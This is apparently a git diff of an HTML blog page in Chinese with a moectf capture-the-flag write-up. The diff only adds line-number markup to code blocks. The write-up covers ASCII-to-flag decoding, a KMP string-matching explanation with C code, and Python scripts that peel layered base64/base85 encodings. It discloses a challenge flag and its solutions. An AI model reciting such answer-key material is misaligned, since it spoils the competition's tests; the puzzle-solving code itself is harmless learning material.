+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c++" data-lang="c++"><span class="line"><span class="cl"><span class="cp">##include &lt;iostream&gt;
 </span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
@@ -395,11 +811,26 @@ lea eax, [esp+30h+var_1F]</code></pre><p>看到那个<code>63 65 6F 6D</code>我
 </span></span><span class="line"><span class="cl"> <span class="k">while</span><span class="p">(</span><span class="n">cin</span> <span class="o">&gt;&gt;</span> <span class="n">x</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"> <span class="k">if</span><span class="p">(</span><span class="n">isdigit</span><span class="p">(</span><span class="n">x</span><span class="p">))</span> <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="n">x</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>得到了这么一串数字: <code>109111101991161021231128911610448110957811184956511097994811010064125</code></p>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>得到了这么一串数字: <code>109111101991161021231128911610448110957811184956511097994811010064125</code></p>
 <p>然后工具人基因觉醒, 手动分类, 分成<code>ASCII</code>应该有的样子:</p>
 <p><code>109 111 101 99 116 102 123 112 89 116 104 48 110 95 78 111 84 95 65 110 97 99 48 110 100 64 125</code></p>
 <p>然后再写一个程序:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c++" data-lang="c++"><span class="line"><span class="cl"><span class="cp">##include &lt;iostream&gt;
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c++" data-lang="c++"><span class="line"><span class="cl"><span class="cp">##include &lt;iostream&gt;
 </span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">x</span><span class="p">;</span>
@@ -407,7 +838,9 @@ lea eax, [esp+30h+var_1F]</code></pre><p>看到那个<code>63 65 6F 6D</code>我
 </span></span><span class="line"><span class="cl"> <span class="k">while</span><span class="p">(</span><span class="n">cin</span> <span class="o">&gt;&gt;</span> <span class="n">x</span><span class="p">){</span>
 </span></span><span class="line"><span class="cl"> <span class="n">putchar</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"> <span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>就是无脑把<code>x</code>当成<code>char</code>来输出..</p>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>就是无脑把<code>x</code>当成<code>char</code>来输出..</p>
 <p>把刚分好类的数字粘贴进去, 最后得到<code>flag</code>: <code>moectf{pYth0n_NoT_Anac0nd@}</code></p>
 <h3 class="heading-element" id="w1nd牛逼"><span>w1nd牛逼！</span>
  <a href="#w1nd%e7%89%9b%e9%80%bc" class="heading-mark">
@@ -431,14 +864,46 @@ lea eax, [esp+30h+var_1F]</code></pre><p>看到那个<code>63 65 6F 6D</code>我
 <p>首先要理解, 朴素的单模式串匹配大概就是枚举每一个文本串元素, 然后从这一位开始不断向后比较, 每次比较失败之后都要从头开始重新比对, 大概期望时间复杂度在 θ(n+m) 左右, 对于一般的弱数据还是阔以跑的了滴. 但是其实是可以被卡成O(nm)的. emmmm并且还是比较容易卡的.</p>
 <p>而 KMP的精髓在于, 对于每次失配之后, 我都不会从头重新开始枚举, 而是根据我已经得知的数据, 从某个特定的位置开始匹配; 而对于模式串的每一位, 都有<strong>唯一</strong>的“特定变化位置”, 这个在失配之后的特定变化位置可以帮助我们利用已有的数据不用从头匹配, 从而节约时间.</p>
 <p>比如我们考虑一组样例:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="err">模式串</span><span class="o">:</span> <span class="n">abcab</span>
-</span></span><span class="line"><span class="cl"><span class="err">文本串</span><span class="o">:</span> <span class="n">abcacababcab</span></span></span></code></pre></div><p>首先, 前四位按位匹配成功, 遇到第五位不同, 而这时, 我们选择将abcab向右移三位, 或者可以直接理解为移动到模式串中与失配字符相同的那一位. 可以简单地理解为, 我们将两个已经遍历过的模式串字符重合, 导致我们可以不用一位一位地移动, 而是根据相同的字符来实现快速移动.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="err">模式串</span><span class="o">:</span> <span class="n">abcab</span>
-</span></span><span class="line"><span class="cl"><span class="err">文本串</span><span class="o">:</span> <span class="n">abcacababcab</span></span></span></code></pre></div><p>但有时不光只会有单个字符重复:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="err">模式串</span><span class="o">:</span> <span class="n">abcabc</span>
-</span></span><span class="line"><span class="cl"><span class="err">文本串</span><span class="o">:</span> <span class="n">abcabdababcabc</span></span></span></code></pre></div><p>当我们发现在第六位失配时, 我们可以将模式串的第一二位移动到第四五位, 因为它们相同 .</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="err">模式串</span><span class="o">:</span> <span class="n">abcabc</span>
-</span></span><span class="line"><span class="cl"><span class="err">文本串</span><span class="o">:</span> <span class="n">abcabdababcabc</span></span></span></code></pre></div><p>那么现在已经很明了了, KMP 的重头戏就在于用失配数组来确定当某一位失配时, 我们可以将前一位跳跃到之前匹配过的某一位. 而此处有几个先决条件需要理解:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="err">模式串</span><span class="o">:</span> <span class="n">abcab</span>
+</span></span><span class="line"><span class="cl"><span class="err">文本串</span><span class="o">:</span> <span class="n">abcacababcab</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>首先, 前四位按位匹配成功, 遇到第五位不同, 而这时, 我们选择将abcab向右移三位, 或者可以直接理解为移动到模式串中与失配字符相同的那一位. 可以简单地理解为, 我们将两个已经遍历过的模式串字符重合, 导致我们可以不用一位一位地移动, 而是根据相同的字符来实现快速移动.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="err">模式串</span><span class="o">:</span> <span class="n">abcab</span>
+</span></span><span class="line"><span class="cl"><span class="err">文本串</span><span class="o">:</span> <span class="n">abcacababcab</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>但有时不光只会有单个字符重复:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="err">模式串</span><span class="o">:</span> <span class="n">abcabc</span>
+</span></span><span class="line"><span class="cl"><span class="err">文本串</span><span class="o">:</span> <span class="n">abcabdababcabc</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>当我们发现在第六位失配时, 我们可以将模式串的第一二位移动到第四五位, 因为它们相同 .</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="err">模式串</span><span class="o">:</span> <span class="n">abcabc</span>
+</span></span><span class="line"><span class="cl"><span class="err">文本串</span><span class="o">:</span> <span class="n">abcabdababcabc</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>那么现在已经很明了了, KMP 的重头戏就在于用失配数组来确定当某一位失配时, 我们可以将前一位跳跃到之前匹配过的某一位. 而此处有几个先决条件需要理解:</p>
 <p>1、<strong>我们的失配数组应当建立在模式串意义下, 而不是文本串意义下</strong>. 因为显然模式串要更加灵活, 在失配后换位时, 更灵活简便地处理.</p>
 <p>2、如何确定位置呢？</p>
 <p>首先我们要明白, 基于先决条件11而言, 我们在预处理时应当考虑当<strong>模式串</strong>的第 i位失配时, 应当跳转到哪里.因为在文本串中, 之前匹配过的所有字符已经没有用了——都是匹配完成或者已经失配的, 所以我们的 kmp 数组 (即是用于确定失配后变化位置的数组, 下同) 应当记录的是:</p>
@@ -446,13 +911,73 @@ lea eax, [esp+30h+var_1F]</code></pre><p>看到那个<code>63 65 6F 6D</code>我
 <p>上述即为移位法则</p>
 <p>3、从前缀后缀来解释 <code>KMP</code> :</p>
 <p>首先解释前后缀(因为太简单就不解释了 ):</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="err">给定串</span><span class="o">:</span> <span class="n">ABCABA</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="err">给定串</span><span class="o">:</span> <span class="n">ABCABA</span>
 </span></span><span class="line"><span class="cl"><span class="err">前缀</span><span class="o">:</span> <span class="n">A</span><span class="p">,</span><span class="n">AB</span><span class="p">,</span><span class="n">ABC</span><span class="p">,</span><span class="n">ABCA</span><span class="p">,</span><span class="n">ABCAB</span><span class="p">,</span><span class="n">ABCABA</span>
-</span></span><span class="line"><span class="cl"><span class="err">后缀</span><span class="o">:</span> <span class="n">A</span><span class="p">,</span><span class="n">BA</span><span class="p">,</span><span class="n">ABA</span><span class="p">,</span><span class="n">CABA</span><span class="p">,</span><span class="n">BCABA</span><span class="p">,</span><span class="n">ABCABA</span></span></span></code></pre></div><p>其实刚才的移位法则就是对于模式串的每个前缀而言, 用 <code>kmp</code> 数组记录到它为止的<strong>模式串前缀的真前缀和真后缀最大相同的位置</strong> (注意, 这个地方没有写错, 是真的有嵌套) . 然而这个地方我们要考虑“<strong>模式串前缀</strong>的前缀和后缀最大相同的位置”原因在于, 我们需要用到 <code>kmp</code>数组换位时, 当且仅当未完全匹配. 所以我们的操作只是针对模式串的前缀−−毕竟是失配函数, 失配之后只有可能是某个部分前缀需要“快速移动”. 所以这就可以解释 <code>KMP</code>中前后缀应用的一个特点:</p>
+</span></span><span class="line"><span class="cl"><span class="err">后缀</span><span class="o">:</span> <span class="n">A</span><span class="p">,</span><span class="n">BA</span><span class="p">,</span><span class="n">ABA</span><span class="p">,</span><span class="n">CABA</span><span class="p">,</span><span class="n">BCABA</span><span class="p">,</span><span class="n">ABCABA</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>其实刚才的移位法则就是对于模式串的每个前缀而言, 用 <code>kmp</code> 数组记录到它为止的<strong>模式串前缀的真前缀和真后缀最大相同的位置</strong> (注意, 这个地方没有写错, 是真的有嵌套) . 然而这个地方我们要考虑“<strong>模式串前缀</strong>的前缀和后缀最大相同的位置”原因在于, 我们需要用到 <code>kmp</code>数组换位时, 当且仅当未完全匹配. 所以我们的操作只是针对模式串的前缀−−毕竟是失配函数, 失配之后只有可能是某个部分前缀需要“快速移动”. 所以这就可以解释 <code>KMP</code>中前后缀应用的一个特点:</p>
 <p><code>KMP</code>中前后缀不包括模式串本身,即<strong>只考虑真前缀和真后缀</strong>,因为模式串本身需要整体考虑, 当且仅当匹配完整个串之后; 而匹配完整个串不就完成匹配了吗&hellip;</p></blockquote>
 <p>这个我觉得很详细了&hellip;那怎么根据<code>KMP</code>算法写代码呢..? ( 我觉得编程题的WP最难写, 还要写<code>TreeDistance</code>&hellip; )</p>
 <p>先把代码贴出来:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c++" data-lang="c++"><span class="line"><span class="cl"><span class="cp">##include &lt;stdio.h&gt;
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c++" data-lang="c++"><span class="line"><span class="cl"><span class="cp">##include &lt;stdio.h&gt;
 </span></span></span><span class="line"><span class="cl"><span class="cp">##include &lt;string.h&gt;
 </span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">char</span> <span class="n">S</span><span class="p">[</span><span class="mi">1000000</span><span class="p">]</span><span class="o">=</span><span class="s">&#34;&#34;</span><span class="p">,</span><span class="n">T</span><span class="p">[</span><span class="mi">1000000</span><span class="p">]</span><span class="o">=</span><span class="s">&#34;&#34;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">next</span><span class="p">[</span><span class="mi">100000</span><span class="p">];</span>
@@ -498,7 +1023,9 @@ lea eax, [esp+30h+var_1F]</code></pre><p>看到那个<code>63 65 6F 6D</code>我
 </span></span><span class="line"><span class="cl"> <span class="c1">//printf(&#34;%d &#34;,i);
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">//system(&#34;pause&#34;);
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>woc&hellip; 我不想写了&hellip; 代码原理已经放出来了,, 接下来的看代码吧&hellip;</p>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>woc&hellip; 我不想写了&hellip; 代码原理已经放出来了,, 接下来的看代码吧&hellip;</p>
 <h3 class="heading-element" id="perfect-repeater"><span>Perfect Repeater</span>
  <a href="#perfect-repeater" class="heading-mark">
  <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
@@ -519,7 +1046,25 @@ lea eax, [esp+30h+var_1F]</code></pre><p>看到那个<code>63 65 6F 6D</code>我
  <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
 </h3><p>这题读了读代码, 发现还真就是随机加密&hellip;</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">random</span> <span class="kn">import</span> <span class="n">Random</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">random</span> <span class="kn">import</span> <span class="n">Random</span>
 </span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flag</span> <span class="kn">import</span> <span class="n">flag</span>
 </span></span><span class="line"><span class="cl">
@@ -532,21 +1077,86 @@ lea eax, [esp+30h+var_1F]</code></pre><p>看到那个<code>63 65 6F 6D</code>我
 </span></span><span class="line"><span class="cl"> <span class="sa">b</span><span class="s1">&#39;w1ndNB&#39;</span> <span class="o">+</span> <span class="n">Encoder</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;secret.txt&#39;</span><span class="p">,</span><span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">out</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl"> <span class="n">out</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span></span></span></code></pre></div><p>发现脚本应该是把正确的<code>flag</code>随机选加密方式加密了30多层, 然后就产生了一个40多MB的大家伙&hellip; 我忽然产生了一个想法, 既然有随机加密算法选择的提示, 那我何不把每种算法的提示头都算出来, 然后每解密一次, 就读个头然后查表, 对应解密呢?</p>
+</span></span><span class="line"><span class="cl"> <span class="n">out</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>发现脚本应该是把正确的<code>flag</code>随机选加密方式加密了30多层, 然后就产生了一个40多MB的大家伙&hellip; 我忽然产生了一个想法, 既然有随机加密算法选择的提示, 那我何不把每种算法的提示头都算出来, 然后每解密一次, 就读个头然后查表, 对应解密呢?</p>
 <p>然后就有了一个小脚本:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">random</span> <span class="kn">import</span> <span class="n">Random</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">random</span> <span class="kn">import</span> <span class="n">Random</span>
 </span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">Random</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl"><span class="n">EncoderSet</span> <span class="o">=</span> <span class="p">[</span><span class="n">a85encode</span><span class="p">,</span><span class="n">b16encode</span><span class="p">,</span><span class="n">b32encode</span><span class="p">,</span><span class="n">b64encode</span><span class="p">,</span><span class="n">b85encode</span><span class="p">]</span>
 </span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">EncoderSet</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl"> <span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">EncoderSet</span><span class="p">)(</span><span class="nb">str</span><span class="p">(</span><span class="n">EncoderSet</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="n">i</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">()))</span></span></span></code></pre></div><p>然后运行这个脚本N次之后, 统计得出所有加密方式可能出现的文件头:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">a85</span> <span class="o">=</span> <span class="p">[</span><span class="sa">b</span><span class="s1">&#39;Fa&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;0E&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;MA==&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;30&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;GA======&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"> <span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">EncoderSet</span><span class="p">)(</span><span class="nb">str</span><span class="p">(</span><span class="n">EncoderSet</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="n">i</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">()))</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后运行这个脚本N次之后, 统计得出所有加密方式可能出现的文件头:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">a85</span> <span class="o">=</span> <span class="p">[</span><span class="sa">b</span><span class="s1">&#39;Fa&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;0E&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;MA==&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;30&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;GA======&#39;</span><span class="p">]</span>
 </span></span><span class="line"><span class="cl"><span class="n">b16</span> <span class="o">=</span> <span class="p">[</span><span class="sa">b</span><span class="s1">&#39;F#&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;0`&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;MQ==&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;31&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;GE======&#39;</span><span class="p">]</span>
 </span></span><span class="line"><span class="cl"><span class="n">b32</span> <span class="o">=</span> <span class="p">[</span><span class="sa">b</span><span class="s1">&#39;G5&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;1&amp;&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;Mg==&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;32&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;GI======&#39;</span><span class="p">]</span>
 </span></span><span class="line"><span class="cl"><span class="n">b64</span> <span class="o">=</span> <span class="p">[</span><span class="sa">b</span><span class="s1">&#39;GX&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;1B&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;Mw==&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;33&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;GM======&#39;</span><span class="p">]</span>
-</span></span><span class="line"><span class="cl"><span class="n">b85</span> <span class="o">=</span> <span class="p">[</span><span class="sa">b</span><span class="s1">&#39;Gy&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;1]&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;NA==&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;34&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;GQ======&#39;</span><span class="p">]</span></span></span></code></pre></div><p>然后写了个脚本:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">b85</span> <span class="o">=</span> <span class="p">[</span><span class="sa">b</span><span class="s1">&#39;Gy&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;1]&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;NA==&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;34&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;GQ======&#39;</span><span class="p">]</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后写了个脚本:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">a85</span> <span class="o">=</span> <span class="p">[</span><span class="sa">b</span><span class="s1">&#39;Fa&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;0E&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;MA==&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;30&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;GA======&#39;</span><span class="p">]</span>
